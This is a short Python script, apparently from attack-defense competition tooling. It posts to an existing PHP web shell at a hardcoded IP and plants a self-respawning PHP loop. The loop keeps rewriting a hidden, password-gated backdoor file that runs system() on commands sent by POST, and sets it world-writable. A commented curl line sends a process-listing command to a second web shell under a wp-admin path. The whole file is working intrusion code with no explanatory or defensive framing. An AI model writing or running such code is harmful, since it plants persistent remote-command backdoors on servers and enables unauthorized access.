import requests
#from base64 import b64decode , b64encode
check = "13tin@min!"
url = "http://39.108.36.103:9999/upload/tinmin123.php"
f = '''
<?php
ignore_user_abort(true);
set_time_limit(0);
while (1){
	$path = \\'.r00t.php\\';
	$data = \\'<?php if(sha1($_POST["check"]) === "1d26c61b6ee02113b82b27f3a1026d1778000daa"){@system($_POST["tinmin"]);}?>\\';
    @file_put_contents($path, $data);
    system(\\'chmod 777 \\'.$path);
    usleep(100);
}
?>
'''

#content = b64encode(f)
#print "file_put_contents('.config.php','%s');"%b64decode(content)

r = requests.post(url,data={"tinmin":"file_put_contents('.config.php','%s');"%f})
r = requests.get("http://39.108.36.103:9999/upload/"+".config.php",timeout = 3,)
print r.text

'''
curl --data "tinmin=ps aux | grep www-data | awk '{print $2}'" http://222.85.25.41:11680/ wp-admin/tinmin.php
'''